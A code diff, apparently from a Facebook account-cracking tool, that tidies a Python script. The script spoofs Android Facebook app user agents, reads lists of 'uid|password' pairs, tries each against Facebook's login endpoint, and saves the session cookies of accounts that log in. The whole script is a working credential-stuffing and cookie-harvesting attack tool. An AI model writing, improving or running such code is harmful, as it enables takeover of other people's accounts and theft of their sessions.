@@ -11,7 +11,6 @@ url = "https://graph.facebook.com/auth/login"
 def useragent():
     fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
     enCRACK1 = ['en_GB', 'en_US']
-    CRACKfban1 = ['MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
     CRACKsim1 = ['Banglalink', 'Grameenphone', 'Robi', 'Airtel', 'Teletalk']
     modelxxx = [
         "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I",
@@ -26,16 +25,14 @@ def useragent():
         "22021211RC"
     ]
     gtt = random.choice(modelxxx)
-    android_version = str(random.randrange(6, 13))
-    fbav = str(random.randint(111, 111)) + '.' + str(random.randint(111, 999)) + '.' + str(random.randint(111, 999)) + '.' + str(random.randint(111, 999))
+    android_version = str(random.randint(6, 13))
+    fbav = f"{random.randint(111, 111)}.{random.randint(111, 999)}.{random.randint(111, 999)}.{random.randint(111, 999)}"
     fbbv = str(random.randint(111111111, 999999999))
     lc = random.choice(enCRACK1)
     cr = random.choice(CRACKsim1)
-    CRACK_ua = CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+    
+    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
     return CRACK_ua
-
-ua = ['FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi']
-
 
 def inc3_cookies(email, pwd):
     ugen = useragent()  # Use a dynamic User-Agent
@@ -105,37 +102,28 @@ def inc3_cookies(email, pwd):
         return cookie
     return None
 
-
 if __name__ == "__main__":
-    # Ask for input and output file paths
     input_file = input("Enter the input file path: ")
     output_file = input("Enter the output file path: ")
 
-    # Open the input and output files
     with open(input_file, "r") as infile, open(output_file, "a") as outfile:
-        # Read each line from the input file
         for line in infile:
             line = line.strip()
             if not line:
-                continue  # Skip empty lines
+                continue
 
-            # Split the line into uid, pass, and cookies (initial value of cookies may be empty)
             parts = line.split("|")
             if len(parts) < 2:
-                continue  # Skip invalid lines
+                continue
             uid = parts[0]
             password = parts[1]
 
-            # Try to extract cookies
-            #cookies = inc3_cookies(uid, password)
             cookies = inc3_cookies(uid, password)
             if cookies:
-                # If token was successfully retrieved, print and log success
                 outfile.write(f"{uid}|{password}|{cookies}\n")
-                print(f"{uid}{c_user}|{password}|{cookies}{RESET}")  # Print success in green
+                print(f"{GREEN}{uid}|{password}|{cookies}{RESET}")
             else:
-                # If login failed, print and log the failure
                 outfile.write(f"{uid}|{password}|login_failed\n")
-                print(f"{RED}{uid}|{password}|login_failed{RESET}")  # Print failure in red
+                print(f"{RED}{uid}|{password}|login_failed{RESET}")
 
     print("Process completed.")
